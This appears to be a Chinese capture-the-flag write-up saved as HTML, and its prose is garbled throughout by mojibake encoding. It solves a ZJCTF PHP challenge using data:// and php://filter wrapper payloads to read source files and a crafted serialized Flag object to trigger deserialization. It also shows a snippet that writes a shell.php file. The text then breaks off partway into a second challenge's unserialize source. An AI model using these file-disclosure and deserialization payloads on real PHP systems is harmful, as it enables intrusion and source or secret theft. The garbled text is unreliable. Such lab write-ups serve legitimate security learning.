<p>åŸæ¥æ˜¯è¿™é‡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><em><strong>file_get_contents()</strong></em></h2><p>file_get_contents() å‡½æ•°åœ¨ PHP ä¸­ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹æˆ–è·å–è¿œç¨‹èµ„æºçš„å†…å®¹ã€‚<br>å®ƒå¯ä»¥è¯»å–é€šè¿‡ GET æ–¹æ³•ä¼ å…¥çš„ URL æˆ–æ–‡ä»¶è·¯å¾„ï¼Œä½†ä¸èƒ½ç›´æ¥è¯»å–é€šè¿‡ GET æ–¹æ³•ä¼ å…¥çš„å­—ç¬¦ä¸²å‚æ•°ã€‚</p>
<p>æ‰€ä»¥åƒè¿™æ ·ä¼ å…¥å­—ç¬¦ä¸²æ˜¯æ²¡ç”¨çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=welcome to the zjctf<br></code></pre></td></tr></table></figure>
<p>æ³•ä¸€ï¼š  </p>
<p>é€šè¿‡data:&#x2F;&#x2F;ä¼ªåè®®ï¼Œè®©å­—ç¬¦ä¸²ä¼ é€’è¿›å»ã€‚è¿™é‡Œä¼ é€’çº¯æ–‡æœ¬ï¼Œpayloadï¼štext&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<p>æ³•äºŒ:<br>é€šè¿‡php:&#x2F;&#x2F;inputä¼ªåè®®æ„é€ POSTè¯·æ±‚ï¼Œä¼ è¿›å»çš„å­—ç¬¦ä¸²å°±æ”¾åœ¨postè¯·æ±‚çš„payloadä¸Š</p>
<p>æˆ‘æ˜¯é€‰æ³•ä¸€äº†ï¼Œæ¯•ç«Ÿç›´æ¥åœ¨urlä¸Šå°±èƒ½å®Œæˆ<br>data:&#x2F;&#x2F; åè®®ï¼š<br>data:&#x2F;&#x2F; åè®®å…è®¸ä½ é€šè¿‡æ•°æ® URI æ¥è®¿é—®æ•°æ®ã€‚ä½ å¯ä»¥å°†æ•°æ®ç›´æ¥åµŒå…¥åˆ° URL ä¸­ï¼Œè€Œä¸éœ€è¦åˆ›å»ºä¸€ä¸ªå®é™…çš„æ–‡ä»¶ã€‚<br>ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// æ‰“å° &quot;I love PHP&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// text/plainï¼Œè¡¨ç¤ºçš„æ˜¯æ–‡æœ¬</span><br><br><span class="hljs-comment">// text/plain;base64, è‹¥çº¯æ–‡æœ¬æ²¡ç”¨å¯ç”¨base64ç¼–ç </span><br></code></pre></td></tr></table></figure>
<p>è¿™æ ·å°±èƒ½ä¼ å…¥welcome to the zjctfäº†</p>
<p>æ¥ä¸‹æ¥  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(); <br></code></pre></td></tr></table></figure>
<blockquote>
<p>æ£€æŸ¥$fileå˜é‡ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸²â€flagâ€ã€‚  </p>
</blockquote>
<blockquote>
<p>preg_match(â€œ&#x2F;flag&#x2F;â€œ,$file)ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…$fileä¸­æ˜¯å¦åŒ…å«â€flagâ€ã€‚  </p>
</blockquote>
<blockquote>
<p>å¦‚æœåŒ¹é…åˆ°â€flagâ€ï¼Œè¾“å‡ºâ€Not now!â€å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œã€‚  </p>
</blockquote>
<p>ç”±äºå¹¶ä¸æ˜¯è¿‡æ»¤å­—ç¬¦ï¼Œæ²¡æ³•ç”¨åŒå†™ç»•è¿‡äº†</p>
<p>è¿™æ ·å…ˆçœ‹ä¸‹é¢ï¼Œæœ‰æç¤ºä¸€ä¸ªuseless.php</p>
<blockquote>
<p>æ ¹æ®ååºåˆ—åŒ–ä»£ç æˆ‘ä»¬å¯ä»¥æ¨æµ‹é¢˜ç›®æƒ³è®©æˆ‘ä»¬æ„é€ ååºåˆ—åŒ–POCè§¦å‘useless.phpé‡Œé¢çš„ç±»ï¼Œ<br>è¦æƒ³æ„é€ POCæˆ‘ä»¬å¾—çŸ¥é“è¿™ä¸ªç±»é•¿ä»€ä¹ˆæ ·ï¼Œ<br>äºæ˜¯é—®é¢˜çš„çŸ›ç›¾æŒ‡å‘äº†useless.phpçš„æºç ï¼Œ<br>è¿™é‡Œåªèƒ½é€šè¿‡php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.phpæ¥æŸ¥çœ‹åŠ å¯†åçš„æºç ï¼ˆä¸åŠ å¯†ä¼šè¢«å½“æˆphpæ‰§è¡Œï¼‰</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//n</span>ode4.anna.nssctf.cn:<span class="hljs-number">28681</span>/?text=data:<span class="hljs-regexp">//</span>text/plain,welcome<span class="hljs-variable">%2</span>0to<span class="hljs-variable">%2</span>0the<span class="hljs-variable">%20zjctf</span>&amp;file=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°useless.phpå¾—å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæœ€åå°±æœ‰:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;file=flag.php;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>æœ€åpocå‡ºäº†passwordçš„payloadï¼Œ  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:7:&quot;flagphp&quot;;&#125;<br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯ä¼ è¿›å»ååªå›æ˜¾äº†ä¸ª  </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br><br><br>oh u find <span class="hljs-keyword">it</span><br><br>U R SO CLOSE <span class="hljs-comment">!///COME ON PLZ</span><br></code></pre></td></tr></table></figure>
<p>æœ€åå»çœ‹åˆ«äººçš„wpæ‰çŸ¥é“flagå°±åŒ…å«åœ¨è¿™ä¸ªé¡µé¢ä¸‹ï¼ŒæŒ‰f12å°±èƒ½çœ‹åˆ°äº†ğŸ˜…<br>æœ€ç»ˆpayload</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>


<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é¢˜æˆ‘å°±åªä¼šæœ€åæ„é€ ååºåˆ—åŒ–çš„pocäº†<br>ä½†ä¹Ÿæ˜¯å­¦åˆ°äº†phpä¼ªåè®®çš„ä¸œè¥¿</p>
<h2 id="notice01"><a href="#notice01" class="headerlink" title="notice01"></a>notice01</h2><h2 id="KIMI-é€éƒ¨åˆ†è§£æ"><a href="#KIMI-é€éƒ¨åˆ†è§£æ" class="headerlink" title="KIMI:é€éƒ¨åˆ†è§£æ"></a>KIMI:é€éƒ¨åˆ†è§£æ</h2><p>include:<br>include æ˜¯ PHP ä¸­çš„ä¸€ä¸ªè¯­å¥ï¼Œç”¨äºåŠ¨æ€åŒ…å«å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹åˆ°å½“å‰è„šæœ¬ä¸­ã€‚<br>å¦‚æœè¢«åŒ…å«çš„æ–‡ä»¶ä¸­åŒ…å« PHP ä»£ç ï¼Œè¿™äº›ä»£ç ä¼šè¢«æ‰§è¡Œã€‚<br>php:&#x2F;&#x2F;filter:<br>php:&#x2F;&#x2F;filter æ˜¯ä¸€ä¸ªä¼ªåè®®ï¼Œå…è®¸å¼€å‘è€…åœ¨è¯»å–æˆ–å†™å…¥æ•°æ®æ—¶åº”ç”¨è¿‡æ»¤å™¨ã€‚å®ƒå¯ä»¥åœ¨æ•°æ®æµæ‰“å¼€æ—¶å¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚<br>convert.base64-encode:<br>è¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œè¡¨ç¤ºå¯¹æ•°æ®è¿›è¡Œ Base64 ç¼–ç ã€‚Base64 ç¼–ç æ˜¯ä¸€ç§å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸º ASCII å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºåœ¨éœ€è¦ä»¥æ–‡æœ¬å½¢å¼ä¼ è¾“äºŒè¿›åˆ¶æ•°æ®çš„åœºæ™¯ã€‚<br>resource&#x3D;useless.php:<br>resource å‚æ•°æŒ‡å®šäº†è¦å¤„ç†çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œæ˜¯ useless.phpã€‚è¿™æ„å‘³ç€è¿‡æ»¤å™¨å°†åº”ç”¨äº useless.php æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<hr>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter "></a>php:&#x2F;&#x2F;filter </h2><p>æ˜¯ PHP ä¸­ä¸€ç§ç‹¬ç‰¹çš„ä¼ªåè®®ï¼Œå®ƒå…è®¸å¼€å‘è€…åœ¨æ•°æ®è¯»å–æˆ–å†™å…¥è¿‡ç¨‹ä¸­åº”ç”¨è¿‡æ»¤å™¨ï¼Œä»è€Œå®ç°å¯¹æ•°æ®çš„å¤„ç†ã€‚å®ƒæ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<p>php:&#x2F;&#x2F;filter åè®®çš„ä¸€èˆ¬è¯­æ³•ä¸ºï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;action&gt;/resource=&lt;å¾…è¿‡æ»¤çš„æ•°æ®æµ&gt;</span><br><br><span class="hljs-comment">//å…¶ä¸­ &lt;action&gt; è¡¨ç¤ºè¦å¯¹æ•°æ®æ‰§è¡Œçš„è¿‡æ»¤æ“ä½œï¼Œå¦‚è¯»å–ï¼ˆreadï¼‰ã€è½¬æ¢ç¼–ç ï¼ˆconvertï¼‰æˆ–å­—ç¬¦ä¸²æ“ä½œï¼ˆstringï¼‰ç­‰ï¼›  </span><br><span class="hljs-comment">//&lt;å¾…è¿‡æ»¤çš„æ•°æ®æµ&gt; é€šå¸¸æ˜¯è¦è¯»å–æˆ–å†™å…¥çš„æ–‡ä»¶è·¯å¾„æˆ– URLã€‚</span><br><span class="hljs-comment">//è¿‡æ»¤å™¨å¯ä»¥è®¾ç½®å¤šä¸ªï¼ŒæŒ‰ç…§é“¾å¼çš„æ–¹å¼ä¾æ¬¡å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤å¤„ç†</span><br></code></pre></td></tr></table></figure>
<p>è¿‡æ»¤å™¨åˆ†ç±»<br>å­—ç¬¦ä¸²è¿‡æ»¤å™¨ï¼šä»¥ string å¼€å¤´ï¼Œå¯¹æ•°æ®è¿›è¡Œå­—ç¬¦ä¸²å¤„ç†ï¼Œå¦‚ rot13ã€toupperã€tolowerã€strip_tags ç­‰ã€‚<br>è½¬æ¢è¿‡æ»¤å™¨ï¼šä»¥ convert å¼€å¤´ï¼Œå¯¹æ•°æ®è¿›è¡Œç¼–ç è½¬æ¢ï¼Œå¦‚ Base64 ç¼–ç ã€è§£ç ï¼ŒQuoted-Printable ç¼–ç ã€è§£ç ï¼Œiconv å­—ç¬¦ç¼–ç è½¬æ¢ç­‰ã€‚<br>å‹ç¼©è¿‡æ»¤å™¨ï¼šå¦‚ zlib.deflateï¼ˆå‹ç¼©ï¼‰ã€zlib.inflateï¼ˆè§£å‹ï¼‰ã€bzip2.compressï¼ˆå‹ç¼©ï¼‰ã€bzip2.decompressï¼ˆè§£å‹ï¼‰ç­‰ã€‚<br>åŠ å¯†è¿‡æ»¤å™¨ï¼šå¦‚ mcrypt.* å’Œ mdecrypt.*ï¼Œç”¨äºæ•°æ®çš„åŠ å¯†å’Œè§£å¯†ã€‚ä¸è¿‡ï¼Œè¿™ä¸ªç‰¹æ€§å·²è‡ª PHP 7.1.0 èµ·åºŸå¼ƒï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚</p>
<p>ç¤ºä¾‹<br>è¯»å–æ–‡ä»¶å¹¶è¿›è¡Œ Base64 ç¼–ç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br>è¿™è¡Œä»£ç ä¼šè¯»å– index.php æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶è¿›è¡Œ Base64 ç¼–ç åè¾“å‡ºã€‚<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>));<br>è¿™è¡Œä»£ç ä¼šå°† Base64 ç¼–ç çš„å­—ç¬¦ä¸²å†™å…¥ shell.php æ–‡ä»¶ï¼Œ<br>å¹¶åœ¨å†™å…¥å‰è¿›è¡Œ Base64 è§£ç ï¼Œæœ€ç»ˆ shell.php æ–‡ä»¶ä¸­å°†åŒ…å«åŸå§‹çš„ <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span> ä»£ç ã€‚<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-18date-2025-03-26-21-35-34tags-unserialize"><a href="#title-note-18date-2025-03-26-21-35-34tags-unserialize" class="headerlink" title="title: note-18date: 2025-03-26 21:35:34tags: unserialize"></a>title: note-18<br>date: 2025-03-26 21:35:34<br>tags: unserialize</h2><h1 id="GDOUCTF-åæ–¹å‘çš„é’Ÿ"><a href="#GDOUCTF-åæ–¹å‘çš„é’Ÿ" class="headerlink" title="GDOUCTF_åæ–¹å‘çš„é’Ÿ"></a>GDOUCTF_åæ–¹å‘çš„é’Ÿ</h1><p>å¼€ç¯‡æºç ï¼Œä½†æ˜¯çœ‹ä¸æ‡‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>çœ‹å¤§ä½¬wp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73668856/article/details/134878471">https://blog.csdn.net/weixin_73668856/article/details/134878471</a></p>
<blockquote>
